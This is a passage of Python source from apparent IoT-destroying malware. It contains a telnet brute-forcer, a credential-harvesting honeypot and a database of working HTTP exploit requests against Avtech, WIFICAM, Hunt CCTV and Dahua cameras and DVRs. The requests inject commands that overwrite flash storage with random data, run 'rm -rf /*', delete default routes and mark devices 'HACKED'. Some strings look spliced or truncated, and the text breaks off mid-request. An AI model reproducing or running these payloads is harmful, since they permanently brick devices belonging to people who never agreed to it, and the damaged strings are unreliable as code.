				bruteforce_loginstate[brutehash] = 2
			if bruteforce_loginstate[brutehash] == 3:
				# expecting password
				masterhash = bruteforce_master[brutehash] 
				tpassword = ''
				# TODO: BUGBUGBUG - index out of range crash here 12.3.2017 - RARE
				if 'XXX:' in brutemaster_dictionarybuf[masterhash][brutemaster_dictionaryindex[masterhash]]:
					matches = re.search( 'XXX:[^:]+:(\S+)', brutemaster_dictionarybuf[masterhash][brutemaster_dictionaryindex[masterhash]] )
					if matches:
						tpassword = matches.group( 1 )
				else:
					tpassword = brutemaster_dictionarybuf[masterhash][brutemaster_dictionaryindex[masterhash]].split('/')[1]
				lfseq = "\n\n"		# sending two LFs by default to get around edge cases
				# hack to deal with C-Data EPONs
				if "rface for EPON System" in bruteforce_lastlog[brutehash]:
					lfseq = "\r\n"
				try:
					sock.send( tpassword + lfseq )
				except:
					bruteforce_close(sock)
					continue
				bruteforce_cmdlog[brutehash] = ''	
				bruteforce_loginstate[brutehash] = 4
				# moved pw dict index increment from here to where we actually register
				# an error because of telnet killers.. TODO check for potential downsides
			if bruteforce_loginstate[brutehash] == 5:
				# logged in, expecting fingerprint or payload
				masterhash = bruteforce_master[brutehash]
				
				# check if we can ID based on login alone
				# first look for login-only matches 
				actionscript = ''
				pendingcmd = ''
				for mitigation in bruteforce_router_mitigations:
					if re.search( mitigation[1], brutemaster_login[masterhash] ) and ( mitigation[2] == '' or ( mitigation[2] == 'PORT:9527:' and brutemaster_ref[masterhash][1] == 9527 ) ):
						actionscript = mitigation[0]
						pendingcmd = mitigation[3:]
						break

				if actionscript:
					bruteforce_loginstate[brutehash] = 7
					brutemaster_actionscript[masterhash] = actionscript
					bruteforce_pendingcmdbuf[brutehash] = pendingcmd
					# ya we could - move on to stage 7
					
					if not bruteforce_push_next_cmd( sock, brutehash, masterhash ):
						continue
					
					continue
				else:
					# attempt fingerprint sequence
					try:
						sock.send(bruteforce_fingerprinting_commands)
					except:
						# should we pass and try again?
						bruteforce_close( sock )
						continue
					# go to stage 6, parse fingerprinting response
					bruteforce_loginstate[brutehash] = 6
					
					continue
				
		# we are handling level 7 timeouts outside readable/writable chunk since
		# we could timeout .. we can handle the read checks elsewhere tho
		if bruteforce_loginstate[brutehash] == 7 and curtime > bruteforce_payloadtimeout[brutehash]:
			if len( bruteforce_pendingcmdbuf[brutehash] ) <= 2:
				# sequence complete
				bruteforce_payloadtimeout[brutehash] = curtime + 10
				bruteforce_loginstate[brutehash] = 9
				try:
					sock.shutdown()
				except:
					pass
				
				continue
			else:
				bruteforce_pendingcmdbuf[brutehash] = bruteforce_pendingcmdbuf[brutehash][2:]
				masterhash = bruteforce_master[brutehash]
				if not bruteforce_push_next_cmd( sock, brutehash, masterhash ):
					continue
					
		if bruteforce_loginstate[brutehash] == 9 and curtime > bruteforce_payloadtimeout[brutehash]:
			bruteforce_close(sock)			
			continue
			
		timetarget = bruteforce_maxconnectiontime_login
		if bruteforce_loginstate[brutehash] >= 5:
			timetarget = bruteforce_maxconnectiontime_payload
		if curtime - bruteforce_connectiontime[brutehash] > timetarget:
			# temp debug - look for potentially missed login prompts
			if bruteforce_loginstate[brutehash] == 4:
				masterhash = bruteforce_master[brutehash]
				tempsearchspan = bruteforce_cmdlog[brutehash][-2:]
				if 'command' in bruteforce_cmdlog[brutehash] or 'help' in bruteforce_cmdlog[brutehash] or tempsearchspan == '> ' or tempsearchspan == '$ ' or tempsearchspan == '# ' or tempsearchspan == '% ':
					if not 'DEBUG avc' in bruteforce_cmdlog[brutehash] and not 'Polycom' in bruteforce_cmdlog[brutehash]:
						if not hash(brutemaster_ref[masterhash][0]) in bfdebugtemp_ipcache:
							lastlog = re.sub( '\r?\n', ';', bruteforce_lastlog[brutehash] )
							lastlog = re.sub( '[^A-Za-z0-9 \.,:;<>\(\)\[\]\-+%!@/#$=]', '', lastlog )
							log_session( 'NOTC: CMDEBUG IP %s:%d %s -> %s' % ( brutemaster_ref[masterhash][0], brutemaster_ref[masterhash][1], brutemaster_dictionarybuf[masterhash][brutemaster_dictionaryindex[masterhash]], lastlog[:768] ) )
							bfdebugtemp_ipcache[hash(brutemaster_ref[masterhash][0])] = 1
			bruteforce_close(sock)
			continue
		# deal with quirky logins by reusing the captcha element
		if bruteforce_loginstate[brutehash] == 4 and bruteforce_captcha[brutehash] == 0:
			masterhash = bruteforce_master[brutehash]
			if curtime - bruteforce_connectiontime[brutehash] > 10:
				try:
					sock.send( "\n" )
				except:
					pass
				bruteforce_captcha[brutehash] = 1
	

################################# bruteforce implementation end ##############################




################################### honeypot module ####################################

# this is a simple telnet honetpot which allows us to capture logins/passwords

honeypot_maxtimeout = 17
honeypot_maxbannerwait = 5

honeypot_socks = []
honeypot_ref = {}
honeypot_loginstate = {}
honeypot_logbuf = {}
honeypot_cmdbuf = {}
honeypot_type = {}		# 0 == telnet, 1 == http
honeypot_connectiontime = {}


def honeypot_sanitize( input ):
	output = ''
	for i in range(len(input)):
		char = input[i]
		cval = ord(char)
		if cval < 32 or cval >= 123 or cval == 96 or cval == 36 or cval == 38:
			output += '\\x%02x' % (cval)
		else:
			output += char
	return output


def honeypot_close( sock ):
	global honeypot_maxtimeout
	
	honeyhash = hash(sock)
	try:
		sock.close()
	except:
		pass

	if honeypot_type[honeyhash] == 0:		# telnet
		if honeypot_loginstate[honeyhash] >= 3:
			# got past password phase
			lastlog = honeypot_sanitize( honeypot_logbuf[honeyhash] )
			banclean = re.sub( '\r?\n', ';', honeypot_ref[honeyhash][2] )
			banclean = re.sub( '[^A-Za-z0-9]', '', banclean )
			
			log_session( "%s:%d HP:%s:%%:%s" %( honeypot_ref[honeyhash][0], honeypot_ref[honeyhash][1], banclean[:16], lastlog[:128] ) );
		
	honeypot_socks.remove(sock)
	honeypot_ref[honeyhash] = None
	honeypot_loginstate[honeyhash] = None
	honeypot_logbuf[honeyhash] = None
	honeypot_cmdbuf[honeyhash] = None
	honeypot_type[honeyhash] = None
	honeypot_connectiontime[honeyhash] = None


randomhoneypottelnetbanners = [
	'192.168.0.9 login: ',
	'\r\n(none) login: ',
	'buildroot login: ',
	'G7SYS login: ',
	'\r\nthemis login: ',
	'Login as: ',
	'Welcome to Stbs world\r\n\r\nUsername: ',
	'BCM96328 Broadband Router\r\nLogin: '
	'BCM99999 Broadband Router\r\nVosLogin: ',
	'Welcome Visiting Huawei Home Gateway\r\nCopyright by Huawei Technologies Co., Ltd.\r\n\r\nLogin: ',
	'User Access Verification\r\n\r\nUsername: ',
	'\r\nWelcome to VeEX(R) V100-IGM/MPX Console.\r\n\r\n(none) login: ',
	'ZyXEL P-870HNU-51B\r\nLogin: ',
	'Account: ',
	' === IMPORTANT ============================\r\n Use passwd to set your login password\r\n this will disable telnet and enable SSH\r\n ------------------------------------------\r\nK2 login: ',
	'\r\nAmbarella login: ',
	'\r\n username: ',
	'WIFIROUTER login: ',
	'F660\r\nLogin: ',
	'F460\r\nLogin: ',
	'LocalHost login: ',
	'\r\nLinux 2.6.30 (DAM-2160i) (pts/1)\r\n\r\nDAM-2160i login: ',
	'tc login: ',
	'tangox login: ',
	'\r\n------acl IP:42.67.34.2 --------\r\nLogin: ',
	'BCM96318 Broadband Router\r\nLogin: ',
	'\r\nIngenic linux machine\r\nKernel 2.6.31.3 on an mips\r\nkopp login: ',
	'\r\nBusyBox on (none) login: ',
	'JZ_INGENIC login: ',
]
honeypotbanner = random.choice(randomhoneypottelnetbanners)
# if we want to replace the honeypot with our announcements..
#honeypotbanner = publicmessage
def handle_honeypot_telnet( connsocket, remote_ip, target_port ):
	# check that we are in a position to support this req
	global honeypotbanner
	banner = honeypotbanner
	password = 'Password: '
	
	if 0:
		try:
			connsocket.close()
		except:
			pass
		return
	honeytuple = ( remote_ip, int(target_port ) )
	honeyhash = hash( connsocket )
	honeypot_socks.append(connsocket)
	honeypot_ref[honeyhash] = ( remote_ip, int(target_port), banner, password )
	honeypot_loginstate[honeyhash] = -1
	honeypot_logbuf[honeyhash] = ''
	honeypot_cmdbuf[honeyhash] = ''
	honeypot_connectiontime[honeyhash] = time.time()
	honeypot_type[honeyhash] = 0

def honeypot_update():
	global honeypot_maxtimeout
	global honeypot_maxbannerwait
	
	curtime = time.time()

	# process sockets
	socktimeout = 0.01
	readable, writable, errored = select.select(honeypot_socks, honeypot_socks, [], socktimeout)
	for sock in honeypot_socks:
		honeyhash = hash(sock)
		sockopt = sock.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
		if sockopt != 0:
			honeypot_close( sock )
			continue
		if sock in readable:
			data = ''
			try:
				data = sock.recv(2048)
			except:
				pass
			if data:
				honeypot_cmdbuf[honeyhash] += data
				if honeypot_loginstate[honeyhash] == 0:
					# we are just eating data here for a few seconds in the hopes of getting over
					# telnet handshake crap
					pass
						
				if honeypot_loginstate[honeyhash] == 2:
					# waiting on linefeed
					honeypot_logbuf[honeyhash] += data
					# we have to echo back crap in this state
					try:
						data = re.sub( '[\x00-\x1f]', '', data );
						sock.send(data)
					except:
						pass
					if '\n' in honeypot_cmdbuf[honeyhash] or '\r' in honeypot_cmdbuf[honeyhash]:
						honeypot_loginstate[honeyhash] = 3
						honeypot_cmdbuf[honeyhash] = ''
						try:
							sock.send('\r\n')
						except:
							pass
						continue
						
				if honeypot_loginstate[honeyhash] == 4:
					# waiting on pass
					honeypot_logbuf[honeyhash] += data
					if '\n' in honeypot_cmdbuf[honeyhash] or '\r' in honeypot_cmdbuf[honeyhash]:
						honeypot_cmdbuf[honeyhash] = ''
						honeypot_loginstate[honeyhash] = 5
						continue
						
				if honeypot_loginstate[honeyhash] == 6:
					honeypot_close(sock)
					continue
						
			else:
				honeypot_close(sock)
				continue
		if sock in writable:
			if honeypot_loginstate[honeyhash] == -1:
				# expecting login banner
#        hello = "\xff\xfb\x03" /* Will Suppress Go Ahead */
#                "\xff\xfb\x01" /* Will Echo */
#                "\xff\xfd\x1f" /* Do Negotiate Window Size */
#                "\xff\xfd\x18" /* Do Negotiate Terminal Type */
#                "\r\nlogin: ";
				try:
					sock.send( '\xff\xfb\x03\xff\xfb\x01\xff\xfd\x1f\xff\xfd\x18' )
				except:
					honeypot_close(sock)
					continue
				honeypot_loginstate[honeyhash] = 0
				continue
			if honeypot_loginstate[honeyhash] == 1:
				# expecting login banner
				try:
					sock.send( honeypot_ref[honeyhash][2] )
				except:
					honeypot_close(sock)
					continue
				honeypot_loginstate[honeyhash] = 2
				continue
			if honeypot_loginstate[honeyhash] == 3:
				# expecting password banner
				try:
					sock.send( honeypot_ref[honeyhash][3] )
				except:
					honeypot_close(sock)
					continue
				honeypot_loginstate[honeyhash] = 4
				continue
			if honeypot_loginstate[honeyhash] == 5:
				retval = '\r\nLogin incorrect. Try again.\r\n'
				try:
					sock.send( retval )
				except:
					honeypot_close(sock)
					continue
				honeypot_loginstate[honeyhash] = 6
				continue

			# out of band check for login banner timeout
			if honeypot_loginstate[honeyhash] == 0:
				timetarget = honeypot_maxbannerwait
				if curtime - honeypot_connectiontime[honeyhash] > timetarget:
					honeypot_cmdbuf[honeyhash] = ''
					honeypot_loginstate[honeyhash] = 1
					continue
				
		timetarget = honeypot_maxtimeout
		if curtime - honeypot_connectiontime[honeyhash] > timetarget:
			honeypot_close(sock)
			continue

############################## honeypot implementation end ##############################




################################ xiongmai pinner module #################################

# just something simple to fuck with xiongmais which can't be bricked immediately


xmpinclient_maxconnectiontime_clientrequest = 20
xmpinclient_waitbetweenattempts = 120
# give some time for other measures..
xmpinclient_initialdelayminutes = 95
# exec for so many times before calling it quits (more than 24h is a waste)
xmpinclient_maxattempts = 500



# task-specific structs
xmpinclient_socks = []
xmpinclient_ref = {}
xmpinclient_master = {}
#xmpinclient_response = {}
xmpinclient_state = {}
#xmpinclient_request = {}
xmpinclient_connectiontime = {}
# here are the main structs keeping track of the overall job
xmpintask_jobs = []
xmpintask_ref = {}
xmpintask_counter = {}
#xmpintask_lastresponse = {}
xmpintask_nextconnectiontime = {}
xmpintask_currentsock = {}



xmpinpayloadr\n\r\n'


def xmpintask_create( targetip, targetport ):
	global xmpinclient_initialdelayminutes
	
	brutetuple = ( targetip, int(targetport ) )
	webhash = hash( brutetuple )
	if webhash in xmpintask_jobs:
		return;

	xmpintask_counter[webhash] = 0
	xmpintask_ref[webhash] = ( targetip, int(targetport) )
	xmpintask_nextconnectiontime[webhash] = time.time() + ( xmpinclient_initialdelayminutes * 60 )
	xmpintask_currentsock[webhash] = None
	xmpintask_jobs.append(webhash)

def xmpinclient_create( targetip, targetport, jobhash ):
	brutetuple = ( targetip, int(targetport ) )
	newsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	newsock.setblocking(0)
	try:
		newsock.connect(brutetuple)
	except:
		pass
	webhash = hash( newsock )
	xmpinclient_socks.append(newsock)
	xmpinclient_ref[webhash] = ( targetip, int(targetport) )
	xmpinclient_state[webhash] = 0
	xmpinclient_connectiontime[webhash] = time.time()
	xmpinclient_master[webhash] = jobhash
	xmpintask_currentsock[jobhash] = newsock
	return newsock

def xmpintask_close( webhash ):
	xmpintask_counter[webhash] = None
	xmpintask_ref[webhash] = None
	xmpintask_nextconnectiontime[webhash] = None
	xmpintask_currentsock[webhash] = None
	xmpintask_jobs.remove(webhash)
	
def xmpinclient_close( sock ):
	global xmpinclient_maxattempts
	global xmpinclient_waitbetweenattempts
	global xmpinclient_maxconnectiontime_clientrequest
	
	webhash = hash(sock)
	jobhash = xmpinclient_master[webhash]
	
	try:
		sock.close()
	except:
		pass

	# set master structs in accordance
	# here allow for a custom next-attempt time (e.g. in case we have a nag screen)
	curtime = time.time()
	if xmpintask_nextconnectiontime[jobhash] <= curtime:
		xmpintask_nextconnectiontime[jobhash] = time.time() + xmpinclient_waitbetweenattempts
	xmpintask_currentsock[jobhash] = None
	xmpintask_counter[jobhash] += 1
  
	xmpinclient_socks.remove(sock)
	xmpinclient_ref[webhash] = None
	xmpinclient_state[webhash] = None
	xmpinclient_connectiontime[webhash] = None
	xmpinclient_master[webhash] = None
	
def xmpintask_update():
	global xmpinpayloads
	global xmpinclient_maxattempts

	curtime = time.time()
	temptasks = xmpintask_jobs
	for task in temptasks:
		jobhash = hash(task)
		if xmpintask_currentsock[jobhash] == None:
			# Are we done?
			if xmpintask_counter[jobhash] >= xmpinclient_maxattempts:
				# yes - call it quits for this job
				xmpintask_close(jobhash)
				continue
		
			# time to create another socket?
			if curtime >= xmpintask_nextconnectiontime[jobhash]:
				newsock = xmpinclient_create( xmpintask_ref[jobhash][0], xmpintask_ref[jobhash][1], jobhash )
				xmpintask_currentsock[jobhash] = newsock
				xmpintask_nextconnectiontime[jobhash] = 0


def xmpinclient_push_request( sock, webhash, jobhash ):
	global xmpinpayload
	try:
		sock.send( xmpinpayload )
	except:
		pass
		
	return 1
				
def xmpinclient_update():
	global xmpinclient_maxconnectiontime_clientrequest
	global xmpinclient_maxconnectiontime_payload
	
	curtime = time.time()

	# process sockets
	socktimeout = 0.01
	readable, writable, errored = select.select(xmpinclient_socks, xmpinclient_socks, [], socktimeout)
	for sock in xmpinclient_socks:
		webhash = hash(sock)
		sockopt = sock.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
		if sockopt != 0:
			xmpinclient_close( sock )
			continue
		if sock in readable:
			data = ''
			try:
				data = sock.recv(2048)
			except:
				pass
			if data:
			  pass
			else:
				xmpinclient_close(sock)
				continue
		if sock in writable:
			if xmpinclient_state[webhash] == 0:
				# expecting request
				jobhash = xmpinclient_master[webhash] 
				xmpinclient_push_request( sock, webhash, jobhash )
				xmpinclient_state[webhash] = 1
				
		timetarget = xmpinclient_maxconnectiontime_clientrequest
		jobhash = xmpinclient_master[webhash] 
		if curtime - xmpinclient_connectiontime[webhash] > timetarget:
			xmpinclient_close(sock)
			continue
	






############################## xiongmai pinner module end ##############################


# just to keep flakier devices from rebooting while parsing this					
time.sleep(3)
# marker for splitting file into smaller parts for piecemeal parsing
splitvar = "SPLTX"


################################### web payload module #################################

# this handles the http payload logic


webclient_maxconnectiontime_clientrequest = 60
webclient_waitbetweenattempts = 0.5

webtaskdatabase = [
  [ 'avtech', 'Linux.*UPnP.*Avtech',
    'GET /cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.* HTTP/1.0\r\n\r\n',
#    'GET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=%%LOGIN%%%20;$(ps)&password=%%PASSWORD%% HTTP/1.0\r\n\r\n',
		'GET /cgi-bin/nobody/VerifyCode.cgi?account=%%CUSTOM1%%&login=quick HTTP/1.0\r\n\r\n',
		'GET /cgi-bin/supervisor/CloudSetup.cgi?exefile=(cat%20/dev/urandom%20%3e/dev/mtdblock3%20%26);(cat%20/dev/urandom%20%3e/dev/mtdblock4%20%26);(cat%20/dev/urandom%20%3e/dev/mtdblock6%20%26);(cat%20/dev/urandom%20%3e/dev/sda2%20%26);((sleep%2017;route%20del%20default)%20%26) HTTP/1.0\r\nCookie: SSID=%%CUSTOM1%%\r\n\r\n',
		'POST /cgi-bin/supervisor/adcommand.cgi HTTP/1.0\r\nCookie: SSID=%%CUSTOM1%%\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nDoShellCmd "strCmd=(cat%20/dev/urandom%20%3e/dev/mtdblock3%20%26);(cat%20/dev/urandom%20%3e/dev/mtdblock4%20%26);(cat%20/dev/urandom%20%3e/dev/mtdblock6%20%26);(cat%20/dev/urandom%20%3e/dev/sda2%20%26);((sleep%2015;route%20del%20default)%20%26)&"',
		'POST /cgi-bin/user/Config.cgi?/nobody HTTP/1.0\r\nCookie: SSID=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\naction=set&Network.BootProto=STATIC&Network.IPAddress=10.%%RAND8%%&Network.DefaultRouter=10.%%COMP8%%&Network.SubnetMask=255.255.255.0&Network.WebPort=%%RANDPORT%%&Network.DNSServer1=1.2.3.4&Network.DNSServer2=1.2.3.5',
		# double tap - sometimes the /nobody trick above does not work but below does with auth
		'POST /cgi-bin/user/Config.cgi HTTP/1.0\r\nCookie: SSID=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\naction=set&Network.BootProto=STATIC&Network.IPAddress=192.168.%%RAND16%%&Network.DefaultRouter=192.168.%%COMP16%%&Network.SubnetMask=255.255.255.0&Network.WebPort=%%RANDPORT%%&Network.DNSServer1=1.2.3.4&Network.DNSServer2=1.2.3.5&Network.UPNP.Enabled.OFF',
		# fallback to 2013 DoS exploit
		'POST /cgi-bin/user/Config.cgi?action=set&Network.SMTP.Receiversr\n\r\n',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
  ],
  [ 'wificam', 'GoAhead-Webs.*WIFICAM',
    'GET system.ini HTTP/1.0\r\n\r\n',
    'GET login.cgi HTTP/1.0\r\n\r\n',

		'GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&svr=192.168.1.1&port=21&user=ftp&pwd=$(cat%20/dev/urandom%20>/dev/root)&dir=/&mode=PORT&upload_interval=0\r\n\r\n',
		'GET /ftptest.cgi?next_url=test_ftp.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%\r\n\r\n',

#		'GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&svr=192.168.1.1&port=21&user=ftp&pwd=$(telnetd%20-p8880%20-l/bin/sh)&dir=/&mode=PORT&upload_interval=0\r\n\r\n',
#		'GET /ftptest.cgi?next_url=test_ftp.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%\r\n\r\n',

		'GET /set_network.cgi?next_url=rebootme.html&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&ipaddr=10.%%RAND8%%&mask=255.255.255.0&gateway=10.%%COMP8%%&dns1=1.2.3.4&dns2=1.2.3.5&dhcp=0&port=%%RANDPORT%%\r\n\r\n',
		'GET /rebootme.htm?loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%\r\n\r\n',
		'GET /reboot.cgi?next_url=reboot.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%\r\n\r\n',
		
		'GET /set_wifi.cgi?next_url=rebootme.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&enable=0&ssid=&mode=0&encrypt=0&authtype=0&keyformat=0&defkey=0&key1=&key2=&key3=&key4=&key1_bits=0&key2_bits=0&key3_bits=0&key4_bits=0&wpa_pask=&channel=0\r\n\r\n',
		'GET /rebootme.htm?loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%\r\n\r\n',
		'GET /reboot.cgi?next_url=reboot.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%\r\n\r\n',

		# the rm -rf seems to work against some units which can't reboot etc
		'GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&svr=192.168.1.1&port=21&user=ftp&pwd=$(rm%20-rf%20/*)&dir=/&mode=PORT&upload_interval=0\r\n\r\n',
		'GET /ftptest.cgi?next_url=test_ftp.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%\r\n\r\n',

		'GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&svr=192.168.1.1&port=21&user=ftp&pwd=$(reboot)&dir=/&mode=PORT&upload_interval=0\r\n\r\n',
		'GET /ftptest.cgi?next_url=test_ftp.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%\r\n\r\n',

		# issue format command, seems to help with some units (if they have TF cards!)
		'GET /set_formatsd.cgi?next_url=recordsch.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%\r\n\r\n',
		'GET /recordsch.htm?loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%\r\n\r\n',

		# this seems to at least disconnect the device temp - need it as a plan C?
		'GET /set_mail.cgi?next_url=mail.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&sender=a@a.com&receiver1=;route$IFSdel$IFSdefault&receiver2=&receiver3=&receiver4=&ssl=0&svr=smtp.google.com&smtpport=25&user=&pwd= HTTP/1.0\r\n\r\n',
		'GET /mailtest.cgi?next_url=test_mail.html&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%% HTTP/1.0\r\n\r\n',

		# if nothing else worked just make the camera nod up and down and hopefully owner does something about it eventually
		'GET /decoder_control.cgi?loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&command=26&onestep=0&11251251512431.21312321313&_=1489741007900\r\n\r\n',

		# a few extra commands to try to get owner's attention
		'GET /set_alias.cgi?loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&alias=HACKED&next_url=alias.htm\r\n\r\n',
		'GET /set_datetime.cgi?next_url=datetime.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&ntp_svr=1.2.3.4&tz=36000&ntp_enable=0\r\n\r\n',
		
		'GET /camera_control.cgi?loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&param=2&value=0&15011526173000.9650471447315604&_=1501152617300\r\n\r\n',
		'GET /camera_control.cgi?loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&param=1&value=0&15011526173000.9650471447315604&_=1501152617301\r\n\r\n',
		'GET /camera_control.cgi?loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&param=9&value=0&15011526173000.9650471447315604&_=1501152617302\r\n\r\n',
		'GET /camera_control.cgi?loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&param=8&value=0&15011526173000.9650471447315604&_=1501152617303\r\n\r\n',
		'GET /decoder_control.cgi?loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&command=94&onestep=0&11251251512431.21312321313&_=1489741007901\r\n\r\n',

#		'GET /set_ftp.cgi?next_url=ftp.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%&svr=192.168.1.1&port=21&user=ftp&pwd=$(route%20del%20default)&dir=/&mode=PORT&upload_interval=0\r\n\r\n',
#		'GET /ftptest.cgi?next_url=test_ftp.htm&loginuse=%%LOGIN%%&loginpas=%%PASSWORD%%\r\n\r\n',
		'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
	],

	# Hunt CCTV
	[ 'huntcctv', 'Server: httpd.*realm=DVR',
		'GET /DVR.cfg HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		'GET /system.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\n\r\n',
		'POST /apply.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\npage=system.html&c32_Titlename=HACKED&c64_Ntp_Server=%60cat+%2Fdev%2Furandom+%3E%2Fdev%2Froot%3Broute+del+default%60&action=Apply',
		'POST /apply.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\npage=ddns.html&i_Ddns_En=0&i_Ddns_Provider=0&c32_Ddns_Host=%60route+del+default%60&c32_Ddns_User=%60cat+%2Fdev%2Furandom+%3E%2Fdev%2Froot%60&c32_Ddns_Pass=testing&i_Ddns_updata=1440&state=IDLE&action=Apply',
		'POST /apply.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\npage=pppoe.html&i_Adsl_En=0&c32_Adsl_User=HACKED&c32_Adsl_Pwd=HACKED&AdslSendMail=ON&i_Adsl_SendMail=1&c32_Adsl_Subj=DVR+is+hacked&action=Apply',
		'POST /apply.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\npage=network.html&i_Protoe_0=0&ul_IPAddress0=10.%%RAND8%%&ul_Netmask0=255.255.255.0&ul_Gateway=10.%%COMP8%%&ul_dns0=1.2.3.4&ul_dns1=1.2.3.5&i_HttpPort=%%RANDPORT%%&action=Apply',
		'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
	],    

	[ 'dahua', '(["/=]more\.js|title>WEB SERVICE</title|css/fn.css|CPPLUS DVR|CONTENT-LENGTH:)',
		'GET /current_config/passwd HTTP/1.0\r\n\r\n',
		'POST /RPC2_Login HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload; DhWebRecordPath=C%3A%5CRecordDownload\r\n\r\n{"method":"global.login","params":{"userName":"%%CUSTOM1%%","password":"","clientType":"Dahua3.0-Web3.0-NOTIE"},"id":10000}',
		'POST /RPC2_Login HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload; DhWebRecordPath=C%3A%5CRecordDownload; DhWebClientSessionID=%%CUSTOM2%%\r\n\r\n {"method":"global.login","session":%%CUSTOM2%%,"params":{"userName":"%%CUSTOM1%%","password":"%%CUSTOM3%%","clientType":"Dahua3.0-Web3.0-NOTIE", "authorityType":"%%CUSTOM4%%"},"id":10000}',
		'POST /RPC2 HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload; DhWebRecordPath=C%3A%5CRecordDownload; DhWebClientSessionID=%%CUSTOM2%%\r\n\r\n{"method":"configManager.setConfig","params":{"name":"VideoColor","table":[[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 